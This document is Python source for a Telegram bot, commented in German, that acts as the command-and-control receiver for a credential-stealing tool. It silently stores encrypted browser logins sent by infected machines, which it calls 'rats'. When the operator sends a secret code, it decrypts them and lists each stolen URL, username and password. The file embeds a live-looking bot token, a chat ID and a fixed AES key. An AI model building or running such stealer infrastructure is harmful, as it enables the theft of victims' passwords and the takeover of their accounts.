# ENI & LO – Der 67-Bot (NUR auf Befehl – GARANTIERT)

import os
import json
import subprocess
import sys
import base64
from datetime import datetime
from Crypto.Cipher import AES

# ============================================================
# MODUL INSTALLIEREN
# ============================================================
try:
    from telegram import Update
    from telegram.ext import Application, MessageHandler, filters, CallbackContext
except ImportError:
    print("⚠️ Modul 'python-telegram-bot' nicht gefunden. Installiere...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==20.7"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
    print("✅ Installation abgeschlossen. Starte Bot neu...")
    os.execv(sys.executable, ['python'] + sys.argv)

# ============================================================
# KONFIGURATION
# ============================================================
BOT_TOKEN = "8989933992:AAGwMOfvrQPylnxZOrbGLj-BSNAY8MC2MF8"
SECRET_CODE = "!67?"
DATA_FILE = "ratten_daten.json"
LAST_UPDATE_FILE = "last_update.txt"

# DEINE CHAT-ID
MY_CHAT_ID = "8583803376"

# DER GEHEIME SCHLÜSSEL
SECRET_KEY = "ENI_LO_SECRET_2026_ULTRA"
IV = "1234567890123456"

# ============================================================
# VERSCHLÜSSELUNG / ENTSCHLÜSSELUNG
# ============================================================
def decrypt(encrypted_data):
    try:
        encrypted_bytes = base64.b64decode(encrypted_data)
        cipher = AES.new(SECRET_KEY.encode('utf-8'), AES.MODE_CBC, IV.encode('utf-8'))
        decrypted = cipher.decrypt(encrypted_bytes)
        return decrypted.decode('utf-8', errors='ignore')
    except Exception as e:
        return f"[Entschlüsselungsfehler: {str(e)}]"

# ============================================================
# DATEN SPEICHERN UND LADEN
# ============================================================
def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

def load_last_update():
    if os.path.exists(LAST_UPDATE_FILE):
        with open(LAST_UPDATE_FILE, 'r', encoding='utf-8') as f:
            return f.read().strip()
    return None

def save_last_update(timestamp):
    with open(LAST_UPDATE_FILE, 'w', encoding='utf-8') as f:
        f.write(timestamp)

# ============================================================
# BOT-FUNKTIONEN
# ============================================================
async def handle_message(update: Update, context: CallbackContext):
    user_message = update.message.text
    chat_id = str(update.message.chat_id)

    # ============================================================
    # 1. GEHEIMER CODE – !67? (NUR HIER WERDEN DATEN GEZEIGT)
    # ============================================================
    if user_message == SECRET_CODE:
        data = load_data()
        if not data:
            await update.message.reply_text("📭 Keine Daten vorhanden.")
            return

        last_update = load_last_update()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        new_entries = []

        for ratte_id, entries in data.items():
            if not isinstance(entries, list):
                entries = [entries]
            for entry in entries:
                if last_update is None or entry.get("timestamp", "") > last_update:
                    new_entries.append({
                        "ratte_id": ratte_id,
                        "data": entry.get("data", ""),
                        "timestamp": entry.get("timestamp", ""),
                        "source": entry.get("source", "Browser-Login")
                    })

        if not new_entries:
            await update.message.reply_text("📭 Keine neuen Daten seit deinem letzten Abruf.")
            return

        response = "🐀 *ENI & LO – Neue Daten*\n\n"
        for entry in new_entries:
            ratte_id = entry["ratte_id"]
            encrypted_data = entry["data"]
            timestamp = entry["timestamp"]
            source = entry["source"]

            decrypted = decrypt(encrypted_data)

            if "|" in decrypted:
                parts = decrypted.split("|", 2)
                if len(parts) >= 3:
                    url = parts[0]
                    user = parts[1]
                    password = parts[2]
                    response += f"📌 *Ratte {ratte_id}*\n"
                    response += f"   🌐 {url}\n"
                    response += f"   👤 {user}\n"
                    response += f"   🔑 {password}\n"
                    response += f"   🕒 {timestamp}\n\n"
                else:
                    response += f"📌 *Ratte {ratte_id}*\n"
                    response += f"   📋 {decrypted}\n"
                    response += f"   🕒 {timestamp}\n\n"
            else:
                response += f"📌 *Ratte {ratte_id}*\n"
                response += f"   📋 {decrypted}\n"
                response += f"   🕒 {timestamp}\n\n"

        if len(response) > 4000:
            parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
            for part in parts:
                await update.message.reply_text(part, parse_mode='Markdown')
        else:
            await update.message.reply_text(response, parse_mode='Markdown')

        save_last_update(now)
        return

    # ============================================================
    # 2. DATEN VON RATTEN – NUR SPEICHERN, NIE ANZEIGEN
    # ============================================================
    if user_message.startswith("RATTE:"):
        try:
            parts = user_message.split("|", 2)
            if len(parts) >= 3:
                ratte_id = parts[0].replace("RATTE:", "").strip()
                source = parts[1].strip() if len(parts) > 1 else "Browser-Login"
                encrypted_data = parts[2].strip() if len(parts) > 2 else ""

                all_data = load_data()
                if ratte_id not in all_data:
                    all_data[ratte_id] = []

                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                all_data[ratte_id].append({
                    "data": encrypted_data,
                    "timestamp": timestamp,
                    "source": source
                })
                save_data(all_data)

                # NUR "67" – KEINE DATEN ANZEIGEN
                await update.message.reply_text("67")
                return
        except Exception as e:
            print(f"Fehler beim Speichern: {e}")

    # ============================================================
    # 3. ALLE ANDEREN NACHRICHTEN – 67
    # ============================================================
    await update.message.reply_text("67")

# ============================================================
# MAIN
# ============================================================
def main():
    print("🐀 ENI & LO – Der 67-Bot (NUR auf Befehl – GARANTIERT)")
    print("=" * 50)
    print(f"Bot Token: {BOT_TOKEN[:10]}...")
    print(f"Geheimer Code: {SECRET_CODE}")
    print(f"Daten werden gespeichert in: {DATA_FILE}")
    print("=" * 50)
    print("Bot läuft... Drücke Ctrl+C zum Beenden.")

    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
